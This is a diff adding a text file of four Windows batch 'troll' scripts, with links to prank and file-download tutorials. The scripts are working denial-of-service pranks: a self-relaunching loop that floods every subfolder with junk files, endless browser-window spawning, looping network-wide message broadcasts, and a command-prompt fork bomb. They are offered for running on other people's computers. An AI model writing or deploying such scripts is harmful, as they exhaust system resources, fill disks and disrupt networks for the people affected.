@@ -1,0 +1,33 @@
+idea 1, text file spammer that self-replicates
+@echo off
+:troll
+start nftroll.bat
+for /r /d %%a in (*) do (for /l %%b in (1,1,100) do (Echo. > %%a\%%b.%RANDOM%.%RANDOM%.troll)
+rem Random number so that multiple windows won't affect it as much.
+goto troll
+To fix,just del /s *.troll
+idea 2, browser opening.
+@echo off
+:troll
+start ietroll.bat
+start iexplore http://peacekeeper.futuremark.com/run.action
+rem pretty much, opening a million windows of testing
+goto troll
+idea 3 spam dialogs to network
+@echo off
+:troll
+msg * Troll!
+goto troll
+idea 4 open command prompt
+@echo off
+:troll
+Start
+start cmdtroll.bat
+goto troll
+
+more:
+http://mathiasgaming.forumotion.com/t12-trolling-with-notepad
+http://stackoverflow.com/questions/23313709/play-invisible-music-with-batch-file
+http://stackoverflow.com/questions/4619088/windows-batch-file-file-download-from-a-url
+http://teusje.wordpress.com/2011/02/19/download-file-with-powershell/
+http://www.game-debate.com/blog/index.php?b_id=7798&author=Hmbhkhk&blog=How%20to%20Troll%20with%20Notepad%20!
